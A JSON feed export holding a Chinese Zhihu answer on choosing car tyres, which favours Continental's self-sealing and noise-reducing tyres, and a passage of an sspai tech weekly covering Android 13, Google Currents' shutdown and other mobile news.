[{"title":"汽车轮胎品牌那么多，该怎样选？","date":"2022-02-16 10:42:03","description":"\n<p data-pid=\"wgavRbNj\">讲家用车轮胎之前，我们先来聊点别的——为什么轮胎这么重要。换句话说，为什么在换轮胎的时候，你需要精挑细选，而不是随便路边找家店换了了事。为什么别处可以省成本，但不起眼的轮胎不能省。</p>\n<p data-pid=\"3NHRrHvW\">关于轮胎的重要性，我的启蒙意识来自于汽车赛事。F1上海大奖赛在2004年登上历史舞台，F1比赛也伴随着央视的大力转播，在国内收获了第一波粉丝和影响力。解说当时普及的第一个概念就是F1比赛的四要素——车手，引擎，轮胎，空气动力学。</p>\n<p data-pid=\"vD67hKOZ\">而在实际观赛中，由于顶尖车手水平大多在毫厘之间，空气动力学效应则很难观察出端倪。V10时代的F1主要看点其实就是两点：谁家发动机更强劲且没有爆缸（莱科宁粉丝掩面痛哭），谁家轮胎策略更优秀。当时的两家轮胎供应商，一个明显圈速更好，但耐久度不行，而另一个则刚好相反，虽然圈速稍慢但更耐磨。两种轮胎也带来了不同的车队对抗策略，这是我对顶级轮胎品牌的初印象。</p>\n<p data-pid=\"3n_G0Y-4\">上了大学开始搞大学生方程式以后，又一家顶级轮胎品牌进入了我的视野——Continental德国马牌轮胎。作为我们学校车队的轮胎赞助商，我在训练场上磨完了不少德国马牌光头胎。现在回忆起来最大的印象是响胎声音非常有层次，从刚开始打滑到彻底突破极限，有一个很线性的滑移率变化过程，很利于我们这些初出茅庐的车手们练习控车，一丝一丝去探索抓地力极限。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-3732c3bc1b4e6b0214246c8ef61c78d3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1304\" data-rawheight=\"870\" data-watermark=\"watermark\" data-original-src=\"v2-3732c3bc1b4e6b0214246c8ef61c78d3\" data-watermark-src=\"v2-96d509245a26beb41c932d4b884920d7\" data-private-watermark-src=\"v2-2f2e0a3706c23859dc8010cdfd507d9b\"></p>\n<p data-pid=\"ZpScQB-2\">现在想来，机缘巧合的事情有两件。第一件是，我从小认知度比较高的这几个轮胎品牌，正好是成年后自己买车换胎用的最多的几个品牌。第二件是，在自行车这个业余爱好领域，我用的最多的恰好也是跟这几个品牌有关系。入坑山地车的时候，为了将山马发扬光大，换成了德国马牌Race King 2.0，后来随着开始玩大行程车，才转成其他品牌。但公路车一直都是用的德国马牌管胎，多年来从来没有出过岔子，路感和耐磨程度是我用过最好的公路管胎。</p>\n<p data-pid=\"qhQBrGEW\">扯远了。说回汽车轮胎的选择。我们且不管赛车是怎么玩的，也不管那些下赛道的玩家怎么选轮胎。对普通家用车来说，选轮胎我认为也是四个要素——规格，安全，舒适，耐久。</p>\n<p><br></p>\n<h2>1.规格</h2>\n<p data-pid=\"BKJ3qev2\">首先得知道自己的轮胎是什么型号，以及这些型号都意味着什么。这些资料在网上一搜一大把，我找了一张相对信息资料最全的一图流：</p>\n<p><img src=\"https://pic3.zhimg.com/v2-10ad37e92e56d58fe129412e559f8058_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"546\" data-watermark=\"watermark\" data-original-src=\"v2-10ad37e92e56d58fe129412e559f8058\" data-watermark-src=\"v2-36dbd4b894afa3b79302b275b8d78919\" data-private-watermark-src=\"v2-7d2f67c4bec801a9622f55f31221f5c0\"></p>\n<p data-pid=\"5w45HdK8\">除了常规标号外，还有一些小标注也值得关注，比如生产的工厂，生产的周数、年份等。</p>\n<p><img src=\"https://pic3.zhimg.com/v2-abc53401507cf6b4609f306c0f798033_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"764\" data-rawheight=\"438\" data-watermark=\"watermark\" data-original-src=\"v2-abc53401507cf6b4609f306c0f798033\" data-watermark-src=\"v2-dcd0fbae2f10b8df6501708e39afd2e5\" data-private-watermark-src=\"v2-0f47530b8fa9923b829e8aa411ce7321\"></p>\n<p data-pid=\"ltBvMBQa\">最后，注意outside字样，别被小作坊装反。同时看下traction也就是滚动方向是否正确。 </p>\n<p><br></p>\n<h2>2.安全</h2>\n<p data-pid=\"Kal0lqWV\">安全是行车的头等大事，而轮胎则是实现安全非常重要的一环，我认为重要度仅次于白车身。</p>\n<p data-pid=\"isGmfxbx\">我们通常把汽车的安全性分为主动安全和被动安全两大部分。主动安全包括基础的操控性、加速和减速性能，也包括进阶的智能辅助驾驶系统，所有这些主动安全的功能，都要依靠四条轮胎来实现。和区块链的「去中心化」正好相反，汽车的主动安全是一个极度「中心化」的分散式链条，好像一个大的钥匙环上连着无数个独立的钥匙，每个钥匙都是一个主动安全功能，而轮胎就是这把钥匙环。</p>\n<p data-pid=\"nc2oSNL3\">而对轮胎本身来说，它的安全性其实也分为两个部分，即行驶安全和失效安全。行驶安全考量的主要是轮胎在不同路面、不同湿度下的抓地力，我们经常谈起的轮胎操控性也在主动安全这个范畴之内。失效安全则是指一旦发生扎胎等意外情况，对车辆动态的影响尽量降低。</p>\n<p data-pid=\"2b50FvAg\">大家普遍对轮胎的行驶安全关注较多，顶级品牌的主流运动型轮胎也都能做到非常优质的抓地性能。我甚至可以说，对主流品牌主打运动性能的产品可以闭眼选。</p>\n<p data-pid=\"ubkUTccM\">但是到了失效安全这里，受到的关注就相对要少很多。在发生扎胎、爆胎等情况时，车辆很容易失控。即使没有失控，车胎没气后也更容易发生脱胎、压伤轮辋的情况，这都是非常危险的场景。为了解决这个问题，常见的有两种方案：</p>\n<p data-pid=\"UR-ekPJq\">一是缺气保用轮胎，使用高硬度的胎壁来做支撑，缺点就是舒适度大打折扣，且一旦爆胎行驶，就意味着轮胎报废，伤钱也是个大问题。宝马就是当前最爱使用缺气保用轮胎的主机厂之一，我的F20出厂装备的缺气保用轮胎，突出一个颠字。不过也确实有实际效果，我媳妇曾经在高速上压过一个深坑，把右前右后轮全部干爆，她当时甚至没有察觉，直到胎压报警后才靠胎壁支撑了十几公里开到服务区。两条轮胎全换，花掉3000大洋。</p>\n<p data-pid=\"dasdzb5v\">所以我更倾向于第二种解决方案，也就是德国马牌的ContiSeal自修补技术，通过自修补能力，让大部分扎胎的情况都能比较从容地被化解，不需要做任何操作。这种技术对大部分汽车消费者可能比较陌生，但自行车玩家一定很熟悉，自补液常见用在高端山地车的真空胎，以及高端公路车的管胎中。我曾经在北京顺义的潮白河河床越野骑行，扎了七八个蒺藜依然虎虎生风，拔掉后自补液可以迅速将破洞填补，整个过程甚至没怎么漏气。</p>\n<p data-pid=\"4YYwWRx7\">自行车的自补液更偏液体，而德国马牌ContiSeal的自修补密封层粘稠度则更高，在胎面覆盖整整一层，在被任何不超过5mm的异物刺穿时，都可以立即将穿刺孔密封。整个过程轮胎气压损失几乎可以忽略不计，在拔出穿刺物后，自修补密封层仍然可以再次修补孔洞，保持密封。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-d5fc665a715f9978a3e9375fe6f2af85_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"830\" data-rawheight=\"624\" data-watermark=\"watermark\" data-original-src=\"v2-d5fc665a715f9978a3e9375fe6f2af85\" data-watermark-src=\"v2-a658338ebdb20784c730978e6cefd254\" data-private-watermark-src=\"v2-fb028857704bdc4a1d5f631b284968d5\"></p>\n<p data-pid=\"-tBzHsNo\">和缺气保用轮胎相比，自修补轮胎的胎壁和普通轮胎无异，有着更好的舒适性、操控性、静音性，经济性就更不用说，甚至比普通轮胎更优。唯一的缺点就是重，大概比普通轮胎增加10-15%的重量。这在每一克都金贵的自行车上确实是需要取舍，但是在汽车轮胎上我觉得没什么好犹豫的，自修补大法好！</p>\n<p><br></p>\n<h2>3.舒适</h2>\n<p data-pid=\"DomD1wcA\">虽然大家意识上都更在意安全性，但在解决了极端情况的后顾之忧后，日常用车时，大部分人身体恐怕会更诚实地在意舒适性。舒适性主要也是两个方面，弹性和静谧性。</p>\n<p data-pid=\"L66CyzOV\">弹性不用多说，和悬架避震一起配合，共同建立起整车的行驶质感。通常来说，高端的普通轮胎行驶质感都不会差（缺气保用轮胎除外！）。</p>\n<p data-pid=\"MZqM-ysx\">静谧性可能是一般最容易感知到的效果，我们通常说的「换套好轮胎如同换辆车」，很大程度上指的就是静谧性的升级。毕竟高速行驶时，主要噪音源就是风噪和胎噪。我第一次有这种感受，是当年把高尔夫的原厂胎换成主打静音轮胎产品的时候，那种巨大的感官变化，光看测评文章是感受不到的。从此以后我就走上了换轮胎只换旗舰款的不归路。</p>\n<p data-pid=\"OEvvO0eX\">但当年那款静音轮胎有个弱点，抓地力不太行，尤其湿地更是如同水上漂。而同门的领款运动担当产品正好相反，抓地力无敌，但静谧性就相对一般。这时候就不得不提德国马牌的另一个亮点技术：ContiSilent静音技术。</p>\n<p data-pid=\"N3ZBLEHR\">技术上也不难理解，依然是在胎面内测做文章，粘贴胎内减震器，也就是聚氨酯泡沫隔层。胎噪的产生实际上是来自于轮胎与路面接触碰撞后产生的振动，而这层聚氨酯泡沫隔层起到的就是一个阻尼的作用，就像悬架的避震器一样，使在摇荡或振动系统中的能量因为受到阻滞而随时间而耗散。</p>\n<p data-pid=\"Eykmbowh\">说人话就是，让轮胎碰撞路面时产生的声波在内减震器这一层就被拦下，被聚氨酯泡沫大大削减振动能量，减少胎噪和胎振。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-98a04d8970365a12b6c631eabefa7d41_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"852\" data-rawheight=\"972\" data-watermark=\"watermark\" data-original-src=\"v2-98a04d8970365a12b6c631eabefa7d41\" data-watermark-src=\"v2-5457b13bd63f1b120c2f50bdcc75bb7b\" data-private-watermark-src=\"v2-86dd782ace6fbd79f1d71304e864346b\"></p>\n<p><br></p>\n<h2>4.耐久</h2>\n<p data-pid=\"zkPrSbJj\">耐久主要关系的是钱包。通常来说，优秀的轮胎往往不那么耐磨，橡胶的抓地力、静音程度，经常是和耐磨程度成反比的。但我依然认为，耐久性是最不需要纳入首要考虑的条件，或者说，可以为了其它性能牺牲耐久。</p>\n<p data-pid=\"wnKV1lrr\">一方面因为轮胎是汽车上各类耗材里更换相对低频的，一般建议更换频次在6年/8万公里，先到先换。另一方面，如我们前面所说，轮胎实在是太重要了，不管你开的是豪华车还是廉价车，都值得用一套参数适配的优质轮胎。</p>\n<p data-pid=\"1xoUW1lO\">况且，跟其它耗材相比，轮胎可能是性价比最高的。有很多高端耗材其实已经处在智商税的范畴了，比如无水冷却液，比如各种小厂作坊吹破天的三无机油，比如号称最无损改装就能提升动力的某些空气滤……</p>\n<p data-pid=\"PYyh_b9E\">而轮胎不同。几千块钱换一套胎，经常能比几万块改的刹车避震、或者大动干戈做的全车隔音，更有效果。而这一次更换能管用好多年，我国私家车平均年行驶里程也就是在1.5万公里上下，换一次胎用6年一般毫无压力。普通人又不是跑营运，没必要在换胎时斤斤计较那几百块钱的差价。别为了两箱油钱，捡芝麻丢西瓜。</p>\n<p data-pid=\"oJ_S8Sfi\">真要心疼这点钱，不如省省那些没必要的装饰和改装，什么底盘护甲、隐形车衣、车漆镀晶、全包围脚垫、全车隔音……</p>\n<h2>说了这么多，小结一下吧：</h2>\n<p data-pid=\"6xJ1Y8pI\">汽车轮胎究竟该怎么选？我的建议是，<b>直接找顶级品牌的旗舰款</b>。选之前想一想自己的需求，是更关注安全还是舒适，在选择产品类型的时候可以做取舍，有些亮点技术可以重点圈出，比如我现在就是德国马牌ContiSeal自修补轮胎的脑残粉。最后，不用在意耐久性和性价比。</p>\n<p data-pid=\"0Mb40CEz\">还有就是，我可能对缺气保用轮胎有偏见，真心不建议大家换缺气保用轮胎，即使奔驰宝马这种娘胎里喜欢带的，也尽快换掉。又硬又颠，动不动就报废，容易硌伤轮辋，扒胎还巨费劲，总而言之就是为了一个优点染了一身缺点的典范。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/cranks?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">Sea</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/338882903/answer/2350896796?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">25 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/364733356?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">国产轮胎哪个品牌比较好？</a><br><a href=\"http://www.zhihu.com/question/40402867?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">现在汽车轮胎品牌好一点的有哪些？小白用户求科普</a><br>\n","link":"http://www.zhihu.com/question/338882903/answer/2350896796?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"Refresh 周报 #23：Android 13 来了、Google+「再入坟墓」等","date":"2022-02-16 09:29:13","description":"\n<p><strong>Matrix 首页推荐</strong></p>\n<p><a href=\"https://sspai.com/matrix\">Matrix</a> 是少数派的写作社区，我们主张分享真实的产品体验，有实用价值的经验与思考。我们会不定期挑选 Matrix 最优质的文章，展示来自用户的最真实的体验和观点。</p>\n<p>文章代表作者个人观点，少数派仅对标题和排版略作修改。</p>\n<hr>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gmtb34taatkrlulg.png\"></figure><p><strong>Refresh 周报编辑部：</strong></p>\n<blockquote><p>过去尘土归尘土，当下仍然生生不息。</p></blockquote>\n<p>如果喜欢本期周报，请在 <a href=\"https://update.substack.com/\" target=\"_blank\">Substack</a> 上订阅 Android Weekly Update。<a href=\"https://update.substack.com/\" target=\"_blank\"><strong>订阅 Refresh 周报</strong></a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gndb34taatkrlum0.png\"></figure><h2>🍰 Android 13 DP1 发布</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gnlb34ta9bscr0gg.png\"></figure><p>之前我们的主编也已经在 sspai 撰写过关于 Android 13 的第一手更新动态，如果你还没有了解过 Android 13 的各种第一手更新动态，可以先参考下面这篇文章来了解。</p>\n<p><strong>关联阅读：</strong><a href=\"https://sspai.com/post/71407\" target=\"_blank\"><strong>《Android 版本上演「三代同堂」：Android 13 DP1 都更新了什么？》</strong></a></p>\n<p>由于已经有了相对详尽的第一时间介绍资料，因此周报这里就不再针对已有内容过多赘述，包括主题取色进一步开放、分应用语言设置以及快捷卡片设置等内容都是第一次 Android 13 更新中的看点。但由于后续关于 Android 13 的新功能仍有更多逐步被挖掘出来，因此周报这里会以补充介绍新功能为主。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gntb34taavnbc1a0.png\"></figure><p>在 Android 13 发布之前，其实 Android 12L 的 Beta 测试阶段也已经进入尾声，其中很多特性都已经被整合进了首个 Android 13 开发者预览版中，Material Design 同时也更新了针对折叠屏的应用开发指南也随之更新。当然严格来讲其实这不算是 Android 13 中的新内容，但毫无疑问今年也会有更多针对折叠屏适配效果更惊艳的 App 登场。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868go5b34ta988761t0.gif\"></figure><p>在 Android 13 DP1 中，Google 在 Pixel 6 的固件中加入了新的虚拟机框架，你甚至可以用 Pixel 6 跑 Windows 11 虚拟机。开发者 <a href=\"https://twitter.com/kdrag0n/status/1492754683445669893?s=20&amp;t=0MOWi5uzzoGoP9lNEjOvKA\" target=\"_blank\">Kdragon</a> 就已经晒出了使用 Pixel 6 运行 Windows 11 的截图，并且号称能释放「接近硬件性能」的运行效率。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868golb34taatkrlumg.png\"></figure><p>另外从现在 Android 13 中一些「细枝末节」，类似苹果 AirPlay 的跨设备媒体投射服务（借助 UWB 与 NFC 实现）以及与桌面端生态（Windows / ChromeOS 都有涉及）也会是本年度的更新重点。Android13 中还引入了有关名为 Eche 的 Phone Hub 拓展，未来可以直接在 ChromeOS 中直接打开手机端的聊天 UI 界面，无需再重新安装。</p>\n<p>并且从当前 9to5Google 的测试来看，这一套桌面端的运行环境依赖的其实是一个特殊的 web App 框架，将 Pixel 手机中已经安装的应用在桌面端以串流的方式重新渲染运行，并且完全可以提取出来在 Windows 11、macOS 以及 Linux 平台中使用。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gpdb34taatkrlun0.png\"></figure><p>不过这些很大程度上其实依赖于 Google Play Service 运行框架，未来有可能与 Android 13 一道发布，但也有可能面向更多低版本 Android 设备推送。</p>\n<p>根据目前公布的 Android 13 开发路线图，今年的 Android 开发者预览版总共只会迎来两个版本，之后就会进入预计将有四个版本的 Beta 测试阶段，并在八月发布首个正式版 Android 13。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gpdb34ta988761tg.png\"></figure><p>最后是目前的 Android 13 设备适配信息：除了 Pixel 3a 确定无缘 Android 13 之外，从 Pixel 6 Pro、da到 Pixel 4 这期间发布的 Pixel 手机都可以通过手动刷入开发者预览版固件的方式参加开发版预览测试。当然照例还是要说：现阶段的 Android 13 仍然处于相当早期的开发阶段，不推荐普通用户在自己的主力机上刷入。</p>\n<p><strong>相关链接：</strong></p>\n<ul>\n<li><a href=\"https://android-developers.googleblog.com/2022/02/first-preview-android-13.html\" target=\"_blank\">更新介绍</a></li>\n<li>\n<a href=\"https://developer.android.com/about/versions/13/get\" target=\"_blank\">加入开发者预览测试</a> (Pixel)</li>\n</ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gplb34taavnbc1ag.png\"></figure><h2>Google Plus 「再入坟墓」</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gptb34ta988761u0.png\"></figure><p>Google Plus 曾经是 Google 在社交网络领域中的众多尝试之一，曾几何时也是最有潜力的那个：不过最终因为安全问题被 Google 在 2019 年正式关闭面向普通用户的版本，转而变为 G-Suite 套件中的 Currents，专供企业用户使用的一个内部社交工具而存在。</p>\n<p>但时间到了 2022 年，即使是这最后一点 Google Plus 的影子最终也难以继续运行下去。由于整合了 Google Chat 服务的 Google Space 发布了面向商务用户的版本，定位相同且没有与 Google 其他软件服务紧密整合的 Currents 其实也就没有存在价值，因此 Google 本周正式 <a href=\"https://workspaceupdates.googleblog.com/2022/02/currents-spaces-migration.html\" target=\"_blank\">宣布</a>，将在 2023 年关闭 Currents，并将现有用户迁移到 Google Space 中。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gq5b34ta9bscr0h0.gif\"></figure><p>虽然对于 Google Plus 不少前用户来讲，最终 Google 在社交媒体中的尝试都宣告失败，但稍微值得宽慰的是这一次 Currents 被砍掉只是因为 Google 内部的产品线调整，用户都还有更好用的替代品，不会像当初 Google Plus 社区关闭时出现的很多「难民」一样了。</p>\n<h2>黑莓品牌手机终难产</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gqdb34ta9bscr0hg.png\"></figure><p>印有黑莓 Logo 的智能手机已经从市场上消失了数年，但仍然有一群粉丝喜欢用有着实体键盘的智能手机。也正是因为如此，关于黑莓品牌以及重新制造智能手机的任何可能性与动向都备受关注。</p>\n<p>由于黑莓公司本身已经逐渐转型从智能手机市场中抽身，但手机品牌的使用授权仍然几经易主，目前手握这一授权的公司是 Onward Mobility，虽然他们一直没有新机发布，但一直声称会发布一款搭载黑莓 Logo 的全键盘智能手机，从最早宣布的 2020 年发布之后，一直跳票延期，之前偶尔还会发一些关于发布延期的公告，到了 2022 年，能发的就只剩《我们还没死》这种了 ……</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gqlb34taatkrlung.png\"></figure><p>但根据最新的信息来看，Onward Mobility 实际上已经失去了黑莓品牌的使用权；这将直接决定最终这一项目的存续与否，但从目前的信息来看，主动权已经不在 Onward Mobility 这方，即使他们想要继续拥有黑莓品牌的使用权，更多也要看当前黑莓公司的意愿：黑莓是否希望智能手机市场中仍然有这一品牌的存在。</p>\n<h2>Linux「旗舰」手机新品</h2>\n<p>Pinephone 是一款曾在 2019 年发布的 Linux 系统智能手机，2022 年这个系列终于迎来的新的硬件升级：名为 Pinephone Pro 的新款 Linux 智能手机已经开始接受预订，除了号称「市场上更新最快的 Linux 手机」之外，这还是一款「完全开源」的手机。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gqtb34taatkrluo0.png\"></figure><p>关于「完全开源」这件事，在系统部分当然是没有太多争议，但在硬件选择上难度就高了不少，因为高通/博通等主流手机芯片厂商的相关硬件代码都是闭源（而且基本没有开源的可能），这也意味着 Pinephone 基本上无法使用当前 Android 智能手机上的那些 SoC。</p>\n<p>因此 Pinephone Pro 搭载的是采用 28nm 制程的 Rockchip RK3399 SoC，它的大致性能相当于高通 650。放在如今即使是以中端机的标准来评判仍是相当落伍的硬件规格。</p>\n<p>其他硬件规格部分，Pinephone 搭载一片 6 英寸 1440×720 的 LCD 屏幕，4GB + 128GB 硬件配置，搭载 3000 mAh 电池，最高支持 15W 有线充电，非常值得一说的是这款手机有着众多独立 DIP 开关，你可以手动关闭手机中的基带、Wi-Fi 以及麦克风/摄像头等硬件的开启权限。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gr5b34ta988761ug.png\"></figure><figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gr5b34ta9bscr0i0.png\"></figure><h2>How Google will use virtualization in Android 13</h2>\n<p><strong>Esper.io | </strong><a href=\"https://blog.esper.io/android-dessert-bites-5-virtualization-in-android-13-351789/\" target=\"_blank\"><strong>文章链接🔗</strong></a></p>\n<p>之前 Refresh 周报中其实已经推荐过前 XDA 主编 Mishaal Rahman 撰写的这篇文章，但本周适逢 Android 13 DP1 正式发布，其中关于 KVM 虚拟机的功能虽然已经初露端倪，更进一步的「MicroDroid」子系统的运行等信息其实目前相关信息都还甚少。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868grdb34taatkrluog.png\"></figure><p>这篇文章或许仍然是将这一功能以及 Android 13 中未来关于虚拟化环境相关功能解释的最清楚的文章之一，仍然相当值得参考。</p>\n<h2>Amazon Echo Show 15 review: Alexa, on your wall and big as hell</h2>\n<p><strong>Android Police | </strong><a href=\"https://www.androidpolice.com/amazon-echo-show-15-review/\" target=\"_blank\"><strong>文章链接🔗</strong></a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868grlb34taavnbc1b0.png\"></figure><p>严格来讲 …… 其实 Amazon Echo Show 是一个与 Android 和 Google 都没有太多关系的硬件系列，它运行的是 Amazon 自研系统。这里想要介绍一下它，只是因为它在我们看来是一款足够有趣的产品。</p>\n<p>和平板电脑不同，智能显示屏往往都长期固定在家庭中的某个位置，而且也的确有很多人买来就是为了充当智能相框，Echo Show 的设计很显然就从相框中获得了很多灵感。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868grlb34taavnbc1bg.png\"></figure><p>它搭载的是一片 15.6\" 1080p LCD 显示屏，在充当智能相框这一部分上显然能比 Google Nest Hub 等传统设计的智能显示屏在家居环境中更为协调，并且 Echo Show 默认只支持壁挂一种效果，当然也还是有独立支架可供购买的；它最大的问题，可能还是 250 美元的起售价。</p>\n<h2>Skagen Falster Gen 6 review</h2>\n<p><strong>GSMArena | </strong><a href=\"https://www.gsmarena.com/skagen_falster_gen_6_review-news-53029.php\" target=\"_blank\"><strong>文章链接🔗</strong></a></p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868grtb34taatkrlup0.png\"></figure><p>虽然直到现在的 WearOS 智能手表市场都还是「除了 Galaxy Watch 4 都不值得推荐」的情况，但随着首批（除了三星之外）智能手表品牌发布的新品即将获得 WearOS 3.0 更新，这种情况也会发生一定程度的改变：至少现在发布的新品在接下来一段时间内都会获得新的系统更新。</p>\n<p>Skagen Falster 是 Fossil 旗下的智能手表产品线，因此无论是在硬件还是外观都能看到一些 Fossil 的影子：近期新推出的 Skagen Falster Gen 6 也是如此。这款手表支持血氧监测，外观设计也更有传统时尚手表的风格，运行的是 WearOS 2.3，Fossil 预计将在今年第一季度内为其更新至 WearOS 3.0。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gsdb34ta9bscr0ig.png\"></figure><p>最后值得一提的是，Skagen Falster 完全是基于 Google WearOS 构建的软件生态，所以无需同时下载多个配对 App 才能正常使用，这可能是它比起 Galaxy Watch 4 来讲为数不多的优势了。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gsdb34ta988761v0.png\"></figure><h2>Chrome 时隔八年换图标</h2>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gslb34taatkrlupg.jpeg\"></figure><p>Chrome 浏览器从 2008 年发布伊始，图标就只经历过两次改版，对很多用户来讲 2014 版本就是一直以来最熟悉的样式。今年二月终于迎来了第三次新样式设计。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gstb34ta988761vg.jpeg\"></figure><p>与上一版（2014 年） Chrome 图标相比，2022 版本主要调整了红黄蓝三色色调，呈现出更鲜艳的观感，并将色块之间的阴影几乎完全移除。同时内侧蓝色圆圈更大：但基本区别都不大，或许你根本就不会注意到。</p>\n<h2>Android 版 Apple Music 小组件</h2>\n<p>本周 <a href=\"https://9to5google.com/2022/02/09/apple-music-widgets-classical/\" target=\"_blank\">9to5Google</a> 研究了 Apple Music Android 版 app 版本更新：新版本 App 中的桌面小组件会更加当前专辑封面来选取小组件颜色，没有播放音乐时则会切换回 Apple Music 默认的粉色色系。（图片来源：9to5Google）。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/2e51b66bad506eeb37d70e5a9b9e39e0\"></figure><p>另外值得一提的是，9to5Google 还在代码中看到了 Apple Music 旗下古典音乐流媒体服务 Apple Classical 的相关信息，或许也是在暗示 Android 版同样会以独立应用的方式发布。</p>\n<h2>LumaFusion Android 版</h2>\n<p>即使你没用过 LumaFusion，你可能也听说过它：作为 iOS/iPadOS 端著名的视频剪辑工具，它往往是展现 iPad 生产力的常客 App，并且去年开发公司 LumaTouch 就宣布将登陆 Android 端。并且本周也在三星新旗舰平板电脑 Galaxy Tab S8 系列发布会中亮相。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gtdb34ta9bscr0j0.png\"></figure><p>相关的 Beta 测试计划从 2021 年就已经开始。除了 Android 版之外，LumaFusion 这次一并发布可以运行在 ChromeBook 设备上的 ChromeOS 版本。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gtlb34ta9887620g.png\"></figure><p>不过就目前来看，除了 LumaFusion 仍然没有给出准确的上架应用商店的时间之外；目前官方宣布支持的设备也只有 Galaxy Tab S8 系列，换言之这款应用首先上架的应用商店很有可能是 Galaxy Store 而非 Google Play Store。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/editor/u_/c868gttb34taavnbc1c0.jpeg\"></figure><p>虽然目前尚无更多新的进展，但至少 LumaTouch 的目标仍然是在2022 年上半年正式发布 Android 版，并且会采用与 iOS 同步的版本号更新策略，尽可能保证两个平台的使用体验一致。</p>\n<h2>其他应用动态</h2>\n<ul><li>YouTube Music 新平板 UI 设计开始面向 iPadOS /Android 端推送：针对大屏设备优化了内容显示效果，专辑封面以及推荐内容都以更小的尺寸显示，iOS 版本也采用了更加原生风格的图标设计。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/bea472f1f48c05f45c375d6931b8fcac\"></figure><ul><li>本周桌面端 Chrome 新的下载界面特性开始在面向 Canary 频道推送，在下载内容时下载图标上会出现一圈进度条来展示下载进度（图片来源：Reddit）。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/7f7ae8fcb0d14d1f1f1972e998f15cbe\"></figure><ul><li>虽然是「最佳 Android 开发者」，但挖付费用户这件事微软可是一点机会都不会放过，随着 Google 旗下办公套件服务 G-Suite 宣布免费用户也必须支付订阅费才能使用之后，微软便迫不及待地宣布为这些现有 G Suite 免费用户提供 Microsoft 365（原 Office 365）首年订阅费六折的优惠。</li></ul>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2022/02/16/article/734721034c1458f4b6f788f9e15bb5a7\"></figure><ul><li>Google Messages 正式成为在 Galaxy S22 系列在美国地区版本默认短信 App，不过之前的 OneUI 默认短信 App 仍然存在，用户可以在系统中手动设置默认 SMS 短信 App。本周 Refresh 周报的编辑们也测试了 Google Messages 的 RCS 聊天以及群组功能，简要体验可以参考 <a href=\"https://t.me/update4weekly/1681\" target=\"_blank\">频道更新内容</a>。</li></ul>\n<figure class=\"image 